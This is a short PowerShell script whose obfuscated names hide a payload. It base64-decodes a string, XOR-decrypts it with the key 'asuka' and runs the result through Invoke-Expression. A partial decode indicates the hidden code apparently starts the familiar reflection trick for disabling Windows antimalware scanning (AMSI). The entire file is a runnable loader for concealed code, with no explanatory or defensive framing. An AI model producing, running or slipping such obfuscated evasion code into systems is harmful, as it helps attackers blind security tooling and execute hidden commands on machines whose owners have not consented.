function Eivae0pu {
    param (
        [string]$data,
        [string]$zeeShie0
    )
    $ahTh7yo6 = ""
    for ($i = 0; $i -lt $data.Length; $i++) {
        $ahTh7yo6 += [char]($data[$i] -bxor $zeeShie0[$i % $zeeShie0.Length])
    }
    return $ahTh7yo6
}

$Noh4choo = "OgAhABAADQA8AE8AMgAGABgABAAMABEAGQASAE8AJgAWAAEAPwAYABEAFgBdAEMARgAyAAoABgAfAAQADABdADgACgAPAAAAFAAQAAYABAAPAAcAWwAqABQAFQAcABgACgAVAAgAHAAbAEUAGgBRAA4ADgBaABwANAAHABwABwASAEYAUwBYAA0AQQBGADIAGABMAE0AQQBUAAYAAgBGAEgAWgBbACwABAAVADUAHAAOAA0ABQBbAF0ATAAAAAwACABFABYAKAAPABoAAQAtAAAACAAfABAADwBGAEEAXgATAEsARgASABoAUgBCAE0ARgA9ABoABQAxABQAEQAZAAIAAgBNACAAAQAKABUACAAQAFIAQgBPAEkAUQAmAA4AFQBDAFMAXgBLAEMANwASABkAHgAEAEMAWgBdAE8ADwAUAB8AGQBHAEUAFQABAAAADgBIAGsA"
$ohz9ga1I = [System.Text.Encoding]::Unicode.GetString([Convert]::FromBase64String($Noh4choo))
$zeeShie0 = "asuka"
$ahTh7yo6a = Eivae0pu -data $ohz9ga1I -zeeShie0 $zeeShie0
Invoke-Expression $ahTh7yo6a
